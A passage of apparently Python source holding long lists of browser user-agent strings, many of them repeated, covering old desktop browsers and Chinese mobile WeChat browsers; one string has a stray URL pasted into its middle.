     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
	 "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
	 "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
	 "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
	 "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
	 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
	 "Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN']

useragent = [
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
